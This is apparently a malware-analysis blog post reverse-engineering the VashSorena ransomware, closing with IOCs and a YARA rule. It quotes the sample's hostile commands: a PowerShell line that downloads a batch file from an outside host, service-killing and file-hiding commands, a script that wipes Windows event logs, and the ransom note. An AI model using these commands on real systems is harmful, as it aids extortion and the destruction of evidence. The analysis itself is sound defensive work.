---
layout: post
title: "VashSorena Ransomware"
---

After seeing this [tweet by @fbgwls245](https://twitter.com/fbgwls245/status/1393788011502997506?s=20), I wanted to try my hand analyzing some Go based malware. The sample is available on [Malware Bazaar](https://bazaar.abuse.ch/sample/39908c43e4124d6fd3362a5cf04cfbc4ac601ee35faf84a21c7979fdf74f05a6/).


One of the first steps I take in analyzing any executable malware is throw it into pestudio. Because all Go binaries are [statically linked](https://en.wikipedia.org/wiki/Static_library) the binaries are huge and contain a lot of library code - this causes pestudio to take a long time to analyze the file. This sample appears to be a valid 64 bit PE, that is not packed. One thing that stands out in the strings analysis portion is the gigantic size of the strings inside the binary. This is a trait of Go - strings are lumped together and accessed by knowing size, unlike C strings that rely on a null terminator (`\0`). This will cause some headaches later, but is not a major obstacle.


![32cd52f26d5bfa135437bc237f50f0e8.png](/images/5bf89193dfa84702be553600dd84c6ba.png)

One Ghidra script that can come in handy is [`golang_renamer.py`](https://github.com/ghidraninja/ghidra_scripts/blob/master/golang_renamer.py). If you're dealing with a stripped binary, this script can help restore function names. Symbols for this binary weren't stripped, so this script isn't necessary here, but I ran it anyway for consistency in function names with other samples.

If you search for `main_` in the Ghidra function window, it will show you the important functions of the program.


![af8559b0a41ccc87e5964b6ec46f8e9e.png](/images/fb8c16fadf914e4c87999bcb5ebc1cdb.png)

There's a lot to cover here, let's start with `main_main`. This is our equivalent of `WinMain` in C based binary. Inside the main body of this function, there are several function calls:


![0a8524bf409b941a0f5b8773fc95b269.png](/images/6961d9fdb0db4b4a8e1ba366011b6739.png)

`main_setIconForExtension_4d7370`
This executes a shell command `reg add HKEY_CLASSES_ROOT\\.Encrypt\\DefaultIcon /t REG_SZ /d %SystemRoot%\\System32\\SHELL32.dll,134 /f` which adds a default icon to the `.encrypt` file type.

To determine what that icon actually is, you can open up `shell32.dll` in Visual Studio and browse for icon #134.  

![05d11fe48c8b441da9efbcbea5d9dfdd.png](/images/09e2c0542d0546129ca9b2d68055598e.png)

One thing that you'll frequently run into during analysis of this binary, is the string issue I mentioned previously. You'll see a string snippet reference here:


![0a944834fcca6ff2e5e2d7f8f2fbb444.png](/images/055d1cb0774f47bab246a741deff4c4b.png)

But if you view the data, it looks like a giant blob of text with cross references everywhere.


![735a271b2ced6d3e9d8916eda7cce6cf.png](/images/33339a560f214c8d820f78263f888d42.png)


By highlighting this variable, right clicking and changing the data type to char, Ghidra will break these apart in a more sane manner. It won't be necessary to recreate all of the strings in the binary, but when you find a reference in the code, jumping back to that section, highlighting the appropriate characters, right clicking and choosing "string" will make your disassembly more readable. (After you've done this once, Ghidra allows you to use "y" as a hotkey to save you some clicking. )



![1ea56d2b3804a628698fb9ca0ce70c41.png](/images/5a0346b01868470d8423721e72b3cdff.png)



`main_KillProcess_4D7420`
This function runs a shell command `taskkill /F /IM ` attempting to kill the processes:

- sqlceip.exe
- sqlwriter.exe
- Spoof.uxe.tmp

`main_delExploit_4D75A0`
This function attempts to clean up several files (presumably, based on function name and location in the program) used to gain access:

- `c:\Users\Public\us.bat`
- `c:\Users\Public\2008.exe`
- `c:\Users\Public\Spoof.uxe.tmp"`
- `c:\Users\Public\rdp.bat`

`main_ClearUsercache_4D7640`
Calls `rmdir` to delete the user's AppData directory

`main_FirstDuty_4D7860`
Calls `attrib +h +s Encrypt.exe`, making the `Encrypt.exe` executable labeled as a hidden, system file.

Then, the function proceeds to use `net stop` to stop a variety of running services:

-MSSQL$SQLEXPRESS
-MSSQLSERVER
-SQLSERVERAGENT
-mysql
-plesksrv

Nested inside this function is a call to `main_getdrives_4D7F70` that loops through the alphabet, A-Z, and attempts to see if there is a drive located there.  

`main_ClearLogDownload_4D9F10`
This function calls PowerShell, with the command `(New-Object System.Net.WebClient).DownloadFile('https://moonlightkrippe.ch/DesktopModules/Journal/clear.txt', 'C:\LOG.bat')`

After retrieving the contents of the file for analysis:
```
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof
:noAdmin
exit
```
Essentially, it is downloading a script that checks if the malware has admin access, and if it does, will use `wevutil.exe` to clear Windows Event logs. After download, the script is invoked in the `main_ClearLog_4D9FC0` function.

`main_MessageRan_4D96D0`
This function writes the ransom note, named `Decrypt_files.txt` to various places on the system. Here is the content of the ransom note:
```
++++++++++++++++++++++++++++++++ Hack For Mandatory Security ++++++++++++++++++++++++++++++++
All Your Files Has Been Locked!
If you think you can decrypt the files we would be happy :)
But all your files are protected by strong encryption with AES RSA 256 using military-grade encryption algorithm
Video Decrypt: Due to the deletion of video on video sharing sites
You can download and watch the video from the link below:

++++++++
https://drive.google.com/file/d/1QAhLOX-sQuyjk31LPPpseRlhaLKEZ_t7/view
++++++++
What does this mean ?
This means that the structure and data within your files have been irrevocably changed,
you will not be able to work with them, read them or see them,
it is the same thing as losing them forever, but with our help, you can restore them.
You Can Send some Files that not Contains Valuable Data To make Sure That Your Files Can be Back with our Tool
Your unique Id :
What are the guarantees that I can decrypt my files after paying the ransom?
Your main guarantee is the ability to decrypt test files.
This means that we can decrypt all your files after paying the ransom.
We have no reason to deceive you after receiving the ransom, since we are not barbarians and moreover it will harm our business.
You Have 2days to Decide to Pay
after 2 Days Decryption Price will Be Double
And after 1 week it will be triple Try to Contact late and You will know
Therefore, we recommend that you make payment within a few hours.
Do not rename encrypted files.
Do not try to decrypt your data using third party software, it may cause permanent data loss.
Again, we emphasize that no one can decrypt files, so don't be a victim of fraud.
It's just a business
Warning : If you email us late You may miss the Decrypt program Because our emails are blocked quickly So it is better as soon as they read email Email us ;)
You can buy bitcoins from the following sites
https://crypto.com
https://www.binance.com
https://www.coinbase.com/
https://localbitcoins.com/buy_bitcoins
https://www.coindesk.com/information/how-can-i-buy-bitcoins
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Hack For Security <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
```

From there the binary will rely on some standard crypto functions to prepare a key and other less interesting things, before executing `main_walk_4D84E0` which walks through files on the file system and skips encryption if their path contains:

- `Decrypt_files.txt`
- `Encrypt.exe`
- `ngrok.exe`
- `Log.bat`
- `C:\Windows`
- `C:\Program Files\Reference Assemblies\`
- `C:\Program Files\Common Files\`
- `C:\Program Files\Internet Explorer\`
- `C:\Program Files (x86)\Reference Assemblies\`
- `C:\Program Files (x86)\Common Files\`
- `C:\Program Files (x86)\Internet Explorer\`
- `C:\Program Files\WindowsApps\`
- `C:\Program Files\Embedded Lockdown Manager\`
- `C:\Program Files\VMware\`
- `C:\ProgramData\Microsoft`

Before finally encrypting with `main_encrypt_4D91B0`, giving a file a new extension of `.Email=[decrypt8070@gmail.com]ID=[VVYUTQCVIAAAKVLP].Encrypt`.

IOCs
Type|Value
---|----
MD5 | `631101614bb5dac04fed6a14470b045e`
SHA256 | `39908c43e4124d6fd3362a5cf04cfbc4ac601ee35faf84a21c7979fdf74f05a6`
File name | `c:\Users\Public\us.bat`
File name | `c:\Users\Public\2008.exe`
File name | `c:\Users\Public\Spoof.uxe.tmp"`
File name | `c:\Users\Public\rdp.bat`
File name | `C:\LOG.bat`
File name | `Encrypt.exe`
File name | `Decrypt_files.txt`
Registry Modification | `HKEY_CLASSES_ROOT\\.Encrypt\\DefaultIcon`
URL | `https://moonlightkrippe.ch/DesktopModules/Journal/clear.txt`

YARA Rule
```
rule VashSorena {
	meta:
		description = "Rule to detect VashSorena Ransomware"
		author = "@hackpatch"
		date = 05172021
		url = "https://www.hacknpatch.com/2021/05/17/VashSorenaRansomware.html"

	strings:
		$mz = {4d 5a}
		$str1 = "C:/Users/VOMINO.IR/" nocase ascii
		$str2 = "Encrypt.go" nocase ascii
		$str3 = "Hack For Security" nocase wide ascii
		$str4 = "moonlightkrippe.ch" nocase wide ascii
		$str5 = "attrib +h +s Encrypt.exe" nocase wide ascii

	condition:
		$mz at 0 and 3 of ($str*)
}
```
